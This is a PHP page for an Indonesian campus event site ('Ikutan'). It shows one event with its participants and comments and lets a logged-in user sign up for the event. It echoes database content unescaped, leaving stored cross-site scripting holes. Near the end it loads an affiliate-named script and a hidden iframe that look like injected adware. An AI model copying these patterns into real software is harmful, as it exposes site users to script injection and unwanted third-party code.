<?php require_once('../Connections/localserver.php'); ?>
<?php
//initialize the session
if (!isset($_SESSION)) {
  session_start();
}

// ** Logout the current user. **
$logoutAction = $_SERVER['PHP_SELF']."?doLogout=true";
if ((isset($_SERVER['QUERY_STRING'])) && ($_SERVER['QUERY_STRING'] != "")){
  $logoutAction .="&". htmlentities($_SERVER['QUERY_STRING']);
}

if ((isset($_GET['doLogout'])) &&($_GET['doLogout']=="true")){
  //to fully log out a visitor we need to clear the session varialbles
  $_SESSION['MM_Username'] = NULL;
  $_SESSION['MM_UserGroup'] = NULL;
  $_SESSION['PrevUrl'] = NULL;
  unset($_SESSION['MM_Username']);
  unset($_SESSION['MM_UserGroup']);
  unset($_SESSION['PrevUrl']);
	
  $logoutGoTo = "../index.php";
  if ($logoutGoTo) {
    header("Location: $logoutGoTo");
    exit;
  }
}
?>
<?php
if (!isset($_SESSION)) {
  session_start();
}
$MM_authorizedUsers = "";
$MM_donotCheckaccess = "true";

// *** Akses terlarang, harus login dulu: Ijinkan atau tolak akses ke halaman ini
function isAuthorized($strUsers, $strGroups, $UserName, $UserGroup) { 
  // Untuk keamanan, asumsikan bahwa visitor GAK dikenal 
  $isValid = False; 

  // Saat visitor udah login ke situs ini, variabel Session MM_Username nge-set sama dengan usernamenya.. 
  // Jadinya, kita tahu kalau user GAK login jika variabel Session blank. 
  if (!empty($UserName)) { 
    // Selain bisa login, lu boleh ngakses ke ganya beberapa user berdasarkan ID saat mereka login.
    // Parse string ke arrays.
    $arrUsers = Explode(",", $strUsers); 
    $arrGroups = Explode(",", $strGroups); 
    if (in_array($UserName, $arrUsers)) { 
      $isValid = true; 
    } 
    // Atau, lu bisa ngebuat restrict access hanya ke beberapa user berdasarkan username.
    if (in_array($UserGroup, $arrGroups)) { 
      $isValid = true; 
    } 
    if (($strUsers == "") && true) { 
      $isValid = true; 
    } 
  } 
  return $isValid; 
}

$MM_restrictGoTo = "../signin.php";
if (!((isset($_SESSION['MM_Username'])) && (isAuthorized("",$MM_authorizedUsers, $_SESSION['MM_Username'], $_SESSION['MM_UserGroup'])))) {   
  $MM_qsChar = "?";
  $MM_referrer = $_SERVER['PHP_SELF'];
  if (strpos($MM_restrictGoTo, "?")) $MM_qsChar = "&";
  if (isset($_SERVER['QUERY_STRING']) && strlen($_SERVER['QUERY_STRING']) > 0) 
  $MM_referrer .= "?" . $_SERVER['QUERY_STRING'];
  $MM_restrictGoTo = $MM_restrictGoTo. $MM_qsChar . "accesscheck=" . urlencode($MM_referrer);
  header("Location: ". $MM_restrictGoTo); 
  exit;
}
?>
<?php
if (!function_exists("GetSQLValueString")) {
function GetSQLValueString($theValue, $theType, $theDefinedValue = "", $theNotDefinedValue = "") 
{
  if (PHP_VERSION < 6) {
    $theValue = get_magic_quotes_gpc() ? stripslashes($theValue) : $theValue;
  }

  $theValue = function_exists("mysql_real_escape_string") ? mysql_real_escape_string($theValue) : mysql_escape_string($theValue);

  switch ($theType) {
    case "text":
      $theValue = ($theValue != "") ? "'" . $theValue . "'" : "NULL";
      break;    
    case "long":
    case "int":
      $theValue = ($theValue != "") ? intval($theValue) : "NULL";
      break;
    case "double":
      $theValue = ($theValue != "") ? doubleval($theValue) : "NULL";
      break;
    case "date":
      $theValue = ($theValue != "") ? "'" . $theValue . "'" : "NULL";
      break;
    case "defined":
      $theValue = ($theValue != "") ? $theDefinedValue : $theNotDefinedValue;
      break;
  }
  return $theValue;
}
}

$colname_eventini = "-1";
if (isset($_GET['eventid'])) {
  $colname_eventini = $_GET['eventid'];
}
mysql_select_db($database_localserver, $localserver);
$query_eventini = sprintf("SELECT * FROM events WHERE idevent = %s", GetSQLValueString($colname_eventini, "int"));
$eventini = mysql_query($query_eventini, $localserver) or die(mysql_error());
$row_eventini = mysql_fetch_assoc($eventini);
$totalRows_eventini = mysql_num_rows($eventini);

$colname_komentar = "-1";
if (isset($_GET['eventid'])) {
  $colname_komentar = $_GET['eventid'];
}
mysql_select_db($database_localserver, $localserver);
$query_komentar = sprintf("SELECT * FROM testimoni WHERE id_event = %s ORDER BY id_event DESC", GetSQLValueString($colname_komentar, "int"));
$komentar = mysql_query($query_komentar, $localserver) or die(mysql_error());
$row_komentar = mysql_fetch_assoc($komentar);
$totalRows_komentar = mysql_num_rows($komentar);

$colname_yangikutan = "-1";
if (isset($_GET['eventid'])) {
  $colname_yangikutan = $_GET['eventid'];
}
mysql_select_db($database_localserver, $localserver);
$query_yangikutan = sprintf("SELECT * FROM ikutevent WHERE id = %s ORDER BY noikut ASC", GetSQLValueString($colname_yangikutan, "int"));
$yangikutan = mysql_query($query_yangikutan, $localserver) or die(mysql_error());
$row_yangikutan = mysql_fetch_assoc($yangikutan);
$totalRows_yangikutan = mysql_num_rows($yangikutan);
?>

<?php

$editFormAction = $_SERVER['PHP_SELF'];
if (isset($_SERVER['QUERY_STRING'])) {
  $editFormAction .= "?" . htmlentities($_SERVER['QUERY_STRING']);
}

$user = $_SESSION['MM_Username'];
if ((isset($_POST["MM_insert"])) && ($_POST["MM_insert"] == "form")) {
  $insertSQL = sprintf("INSERT INTO ikutevent (`username`,  `nama`, `id`, `img`, `tanggal`, `tempat`) VALUES (%s, %s, %s, %s, %s, %s)",
  					GetSQLValueString($user, "text"),
					GetSQLValueString($row_eventini['nama'], "text"),
          GetSQLValueString($row_eventini['idevent'], "text"),
					GetSQLValueString($row_eventini['img'], "text"),
                       GetSQLValueString($row_eventini['tanggal'], "text"),
					   GetSQLValueString($row_eventini['tempat'], "text"));

  mysql_select_db($database_localserver, $localserver);
  $Result1 = mysql_query($insertSQL, $localserver) or die(mysql_error());
  $insertGoTo = "eventsaya.php";
    if (isset($_SERVER['QUERY_STRING'])) {
    $insertGoTo .= (strpos($insertGoTo, '?')) ? "&" : "?";
    $insertGoTo .= $_SERVER['QUERY_STRING'];
  }
  header(sprintf("Location: %s", $insertGoTo));
}

?>
<!DOCTYPE html>
<html class=" js no-touch" style="" lang="en"><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <meta charset="utf-8">
    <title>Ikutan - Cool Events For You</title>
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

<link href="asset/bootstrap.css" rel="stylesheet">
<link href="asset/shopfrog.css" rel="stylesheet" media="screen">   

<link href="asset/shopfrog-brown.css" rel="stylesheet" media="screen">

<link href="asset/rateit.css" rel="stylesheet" media="screen">		       
<link href="asset/magnific-popup.css" rel="stylesheet"> 		
<script src="asset/all.js" id="facebook-jssdk"></script><script src="asset/widgets.js" id="twitter-wjs"></script><script async src="asset/cbgapi.loaded_1"></script><script async src="asset/cbgapi.loaded_0"></script><script gapi_processed="true" src="asset/plusone.js" async type="text/javascript"></script><script src="asset/respond.js"></script>
<link rel="shortcut icon" href="img/kaoskece.png">
<link href="asset/css.css" rel="stylesheet" type="text/css">
<link href="asset/css_002.css" rel="stylesheet" type="text/css">
<link href="asset/atas.css" rel="stylesheet" type="text/css">

<script src="asset/jquery-1.js"></script>    
<script src="asset/modernizr.js"></script>	
<script src="asset/imagesloaded.js"></script>	
<script src="asset/jquery_003.js"></script>	
<script src="asset/jquery_002.js"></script>		
<script src="asset/jquery.js"></script>				
<script src="asset/bootstrap.js"></script>
<script src="asset/shopfrog.js"></script>
</head>
<body data-twttr-rendered="true" class="product-page">
			
	<header class="navbar navbar-fixed-top clearfix">
		
	<a class="brand" href="index.php">Ikutan</a>

	<!--<div id="nav-basket" class="basket">
		<a href="index.php/views/index.php?doLogout=true" class="basket-link">
			<button class="btn btn-default btn-success" style="margin-top: 15px;">Logout</button>
		</a>
        <a href="update_profile.php"><strong class="btn btn-success">@ <?php echo $_SESSION['MM_Username']; ?></strong></a>
		
	</div>-->
    <div id="nav-basket" class="basket">
        <a href="signin.php" class="basket-link"  style="height: 10px;">
  <a href="update_profile.php"><strong class="btn btn-success">@ <?php echo $_SESSION['MM_Username']; ?></strong></a>
  
  <strong class="btn btn-success"><a href="<?php echo $logoutAction ?>">Logout</a></strong>
 
  
</div>
	
	<button type="button" class="btn navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
		<span class="icon-bar"></span>
		<span class="icon-bar"></span>
		<span class="icon-bar"></span>
	</button>

	<nav class="navbar-collapse collapse" id="main-nav">
		<ul class="nav">
			<li class="active">
				<a href="index.php" class="top-level flat">Home</a>
			</li>
			
			<li>
				<a href="http://localhost/ikutan/views/explore.php" class="top-level">Explore</a>
				
			</li>
             <li>
				<a href="http://localhost/ikutan/views/tambah_event.php" class="top-level">Tambah Event</a>
				
			</li>
			 <li>
				<a href="http://localhost/ikutan/views/eventsaya.php" class="top-level">Event Saya</a>
				
			</li>	
			<!-- <li><a href="http://leapfrogui.com/shopfrog/brown/collection.html" class="top-level flat">Accessories</a></li>								 -->
		</ul>
	</nav><!--/.nav-collapse -->
	
</header>


	
	<div class="container">
		<div class="row">

			<!-- <div class="col-xs-12"> -->
				<!-- <a href="index.php">Home</a> &gt; <a href="http://leapfrogui.com/shopfrog/brown/collection.html">Events</a> &gt; <a href="http://leapfrogui.com/shopfrog/brown/collection.html">Satu</a> &gt; Makan2  -->
			</div> <!-- //end span12 -->

		</div> <!-- //end row -->
	</div> <!-- //end container -->
	
	<div class="container product-main">
		<div class="row">

			<div class="col-sm-6">
				<div class="content">
				
					<!-- Product information for small screens -->
					<div class="product-details-small">
						<!-- Product name and manufacturer -->
						<h1>Nama Event</h1>
						<small>by <a href="">anasbladz</a></small>

						<!-- Product rating and review info -->
						<div class="ratings clearfix">
						</div>
					
						<!-- Pricing and offer info -->
						
					</div>
				
					<div class="main-imgs clearfix">
						<a href="product-1.jpg" title="BeachFront Frog swimsuit: view 1"><img id="img1" src="<?php echo $row_eventini['img']; ?>" alt="Event" class="main-img img-responsive img-rounded img-thumbnail"></a><a href="product-2.jpg" title="BeachFront Frog swimsuit: view 2"><img id="img2" src="asset/product-2.jpg" alt="BeachFront Frog swimsuit" class="main-img img-responsive background"></a>
                        
					</div>
</div>
			</div> <!-- // end span6 -->

			<div class="col-sm-6">
				<div class="content">
					
					<!-- Product information for large screens -->
					<div class="product-details-large">
						<!-- Product name and manufacturer -->
						<h1><span><a href="updatepoin.php?eventid=<?php echo $row_eventini['idevent']; ?>" class="label label-danger plabel" style="font-size:20px"><?php echo $row_eventini['point']; ?></a></span> <?php echo $row_eventini['nama']; ?> <span class="label label-info" style="font-size:12px"><?php echo $row_eventini['kategori']; ?></span></h1>
						<small>by <a href="user.php?user=<?php echo $row_eventini['pembuat'] ?>"><?php echo $row_eventini['pembuat']; ?></a></small>

						<!-- Product rating and review info -->
						<div class="ratings clearfix">
							<div class="extra">
								<!-- <a href="http://leapfrogui.com/shopfrog/brown/review-product.html">Tulis Komentar</a> -->
							</div>
						</div>
					
						<!-- Pricing and offer info -->
						
					</div>
					
					<!-- Product options -->
                    <?php if (time() < strtotime($row_eventini['tanggal'])) {  ?>
					<form class="form" action="<?php echo $editFormAction; ?>" method="POST">
						
													
						<button class="btn btn-large btn-atc" type="submit">Tambahkan ke daftar</button>
                        <input type="hidden" name="MM_insert" value="form" />
					</form>
                    <?php } else {?>
                    <p class="btn btn-large btn-danger" type="submit">Event sudah kadaluarsa</p>
                    <?php } ?>
					<p><strong>Yang Ikutan</strong>:</p>
                    <p>
                      <?php do { ?>
                          <?php if ($totalRows_yangikutan > 0) { // Show if recordset not empty ?>
  <a href="user.php?user=<?php echo $row_yangikutan['username']; ?>"><span class="label label-primary" style="margin-right: 5pxpx;">@<?php echo $row_yangikutan['username']; ?></span> </a>
  <?php }  else echo "Belum ada yang mau ikutan.. "; ?>
<?php } while ($row_yangikutan = mysql_fetch_assoc($yangikutan)); ?>
                    </p>
                    <br><br>
				  <!-- Product description etc -->
					<ul class="nav nav-tabs" id="product-tabs">
						<li class="active"><a href="#description">Deskripsi</a></li>
						<li><a href="#care">Tanggal dan Tempat</a></li>
						<li><a href="#sizing">Foto Tempat</a></li>
					</ul>
					<div class="tab-content">
						<div class="tab-pane active" id="description">
							<p><?php echo $row_eventini['deskripsi']; ?> </p>
						</div>
						<div class="tab-pane" id="care">
							<p>
															  <?php 

if ($row_eventini['tempat']=="tempat/alhur.jpg") {
	echo "Masjid Al-Hurriyah";
} elseif ($row_eventini['tempat']=="tempat/audit _toyib_faperta.jpg") {
	echo "Audit Toyib Faperta";
} elseif ($row_eventini['tempat']=="tempat/audit_abdul_muis_fateta.jpg") {
	echo "Audit Abdul Muis Fateta";
} elseif ($row_eventini['tempat']=="tempat/audit_AHN.jpg") {
	echo "Audit AHN";
} elseif ($row_eventini['tempat']=="tempat/audit_JHH_fapet.jpg") {
	echo "Audit JHH Fapet";
} elseif ($row_eventini['tempat']=="tempat/audit_sumardi_fpil.jpg") {
	echo "Audit Sumardi FPIK";
} elseif ($row_eventini['tempat']=="tempat/gladiator.jpg") {
	echo "Gladiator";
} elseif ($row_eventini['tempat']=="tempat/gmsk.jpg") {
	echo "GMSK";
} elseif ($row_eventini['tempat']=="tempat/gww.jpg") {
	echo "GWW";
} elseif ($row_eventini['tempat']=="tempat/gym.jpg") {
	echo "Gymnasium";
} elseif ($row_eventini['tempat']=="tempat/korfat.jpg") {
	echo "Koridor Fateta";
} elseif ($row_eventini['tempat']=="tempat/Koridor_gka.jpg") {
	echo "Koridor GKA";
} elseif ($row_eventini['tempat']=="tempat/Korpin.jpg") {
	echo "Koridor Pinus";
} elseif ($row_eventini['tempat']=="tempat/Kortan.jpg") {
	echo "Koridor Tanah";
} elseif ($row_eventini['tempat']=="tempat/media_center.jpg") {
	echo "Media Center";
} elseif ($row_eventini['tempat']=="tempat/POMI.jpg") {
	echo "Pojok Mipa";
} else {
	echo "SC FMIPA";
}

?>
				
							<p><?php echo $row_eventini['tanggal']; ?></p>
						</div>
						<div class="tab-pane" id="sizing">
							<img id="img1" src="<?php echo $row_eventini['tempat']; ?>" alt="Event" class="main-img img-responsive img-rounded img-thumbnail">
						</div>
					</div>
					
					<!-- Share -->
					
					
					
				</div>
			</div> <!-- // end span6 -->
			
		</div> <!-- //end row -->

		<div class="row" id="reviews">
			<div class="col-xs-12">
				<div class="review-overview">
					
				</div>

				<div class="product-review">
	<div class="row">
		<?php do { ?>
		  <div class="col-sm-12">
		    <div class="content">
		      <header>
		        <p><strong><?php echo $row_komentar['komentator']; ?></strong></p>
		        </header>
		      
		      <p class="well"><strong><?php echo $row_komentar['status']; ?></strong><br><br><?php echo $row_komentar['komentar']; ?></p>
		      
		    
		      </div>
		    </div>
		  <?php } while ($row_komentar = mysql_fetch_assoc($komentar)); ?>
		
	</div>
</div>
				
				<div class="product-review">
	<div class="row"></div>
</div>
				
				<div class="product-review">
	<div class="row"></div>
</div>										
	<a class="btn btn-default btn-atc" href="tambahkomentar.php?eventid=<?php echo $row_eventini['idevent']; ?>" style="margin-left: 34px; margin-bottom: 24px; margin-top: 18px;">Tulis Komentar</a>			
			</div> <!-- //end span12 -->
		</div> <!-- //end row -->		
		
			
		
	</div> <!-- //end container -->
	
	<footer>
	<div class="container">
		
	</div>
</footer>
	
	<!-- Social sharing scripts -->
<!-- Google plus -->
<script type="text/javascript">
	(function() {
		var po = document.createElement('script'); po.type = 'text/javascript'; po.async = true;
		po.src = 'https://apis.google.com/js/plusone.js';
		var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);
	})();
</script>
<!-- Twitter -->
<script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0],p=/^http:/.test(d.location)?'http':'https';if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src=p+'://platform.twitter.com/widgets.js';fjs.parentNode.insertBefore(js,fjs);}}(document, 'script', 'twitter-wjs');</script>
<!-- Pinterest -->
<script type="text/javascript">
	(function(d){
		var f = d.getElementsByTagName('SCRIPT')[0], p = d.createElement('SCRIPT');
		p.type = 'text/javascript';
		p.async = true;
		p.src = '//assets.pinterest.com/js/pinit.js';
		f.parentNode.insertBefore(p, f);
	}(document));
</script><iframe style="width: 1px; height: 1px; position: absolute; top: -100px;" src="asset/postmessageRelay.htm" id="oauth2relay293021207" name="oauth2relay293021207"></iframe>
<!-- Facebook -->
<div class=" fb_reset" id="fb-root"><div style="position: absolute; top: -10000px; height: 0px; width: 0px;"><div><iframe src="asset/xd_arbiter.htm" style="border: medium none;" tab-index="-1" title="Facebook Cross Domain Communication Frame" aria-hidden="true" id="fb_xdm_frame_http" allowtransparency="true" name="fb_xdm_frame_http" frameborder="0" scrolling="no"></iframe><iframe src="asset/xd_arbiter_002.htm" style="border: medium none;" tab-index="-1" title="Facebook Cross Domain Communication Frame" aria-hidden="true" id="fb_xdm_frame_https" allowtransparency="true" name="fb_xdm_frame_https" frameborder="0" scrolling="no"></iframe></div></div><div style="position: absolute; top: -10000px; height: 0px; width: 0px;"><div></div></div></div>
<script>
	(function(d, s, id) {
		var js, fjs = d.getElementsByTagName(s)[0];
		if (d.getElementById(id)) return;
		js = d.createElement(s); js.id = id;
		js.src = "//connect.facebook.net/en_US/all.js#xfbml=1";
		fjs.parentNode.insertBefore(js, fjs);
	}(document, 'script', 'facebook-jssdk'));
</script>


<script src="asset/aeyJhZmZpZCI6MTAxOCwic3ViYWZmaWQiOjEwMTAsImhyZWYiOiJodHRwOi8v.js"></script><script src="asset/spops-2.js" charset="UTF-8" type="text/javascript"></script><iframe src="asset/pquery-0.htm" style="display: none;"></iframe></body></html>
<?php
mysql_free_result($eventini);

mysql_free_result($komentar);

mysql_free_result($yangikutan);
?>
